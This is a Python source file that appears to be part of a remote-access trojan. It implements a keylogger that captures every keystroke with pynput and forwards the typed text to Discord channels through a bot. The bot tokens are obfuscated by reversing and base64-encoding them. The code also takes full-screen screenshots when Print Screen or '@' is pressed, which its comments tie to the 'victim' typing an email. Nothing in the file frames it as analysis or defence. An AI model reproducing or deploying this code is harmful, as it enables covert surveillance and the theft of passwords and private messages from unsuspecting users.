from pynput.keyboard import Key, Listener
from resources.misc import *
from PIL import ImageGrab
# end of imports

# anywhere
def on_press(key):
    global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
    processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key

    keycodes = {
        Key.space : ' ',
        Key.shift : ' *`SHIFT`*',
        Key.tab : ' *`TAB`*',
        Key.backspace : ' *`<`*',
        Key.esc : ' *`ESC`*',
        Key.caps_lock : ' *`CAPS LOCK`*',
        Key.f1 : ' *`F1`*',
        Key.f2 : ' *`F2`*',
        Key.f3 : ' *`F3`*',
        Key.f4 : ' *`F4`*',
        Key.f5 : ' *`F5`*',
        Key.f6 : ' *`F6`*',
        Key.f7 : ' *`F7`*',
        Key.f8 : ' *`F8`*',
        Key.f9 : ' *`F9`*',
        Key.f10 : ' *`F10`*',
        Key.f11 : ' *`F11`*',
        Key.f12 : ' *`F12`*',

    }
    if processed_key in ctrl_codes.keys():
        processed_key = ' `' + ctrl_codes[processed_key] + '`'
        #.log Victim has used the CTRL shortcut
    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
        for i in keycodes:
            if processed_key == i:
                processed_key = keycodes[i]
        if processed_key == Key.enter:
            processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
        elif processed_key == Key.print_screen or processed_key == '@':
                #.log Print screen or @ pressed
                processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
                ImageGrab.grab(all_screens=True).save('ss.png')
                #.log Saved screenshot of this PC
                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
                #.log Added new embed to send (containing screenshot of this PC)
        text_buffor += str(processed_key)
        if len(text_buffor) > 1975:
            if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or 'ddddd' in text_buffor:
                messages_to_send.append([channel_ids['spam'], text_buffor])
            else:
                messages_to_send.append([channel_ids['main'], text_buffor])
            text_buffor = ''

# bottom
with Listener(on_press=on_press) as listener:
    for token in bot_tokens:
        decoded_token = base64.b64decode(token[::-1]).decode()
        try:
            client.run(decoded_token)
            #.log Started Discord BOT client session
        except: pass
    #.log Starting keylogger
    listener.join()
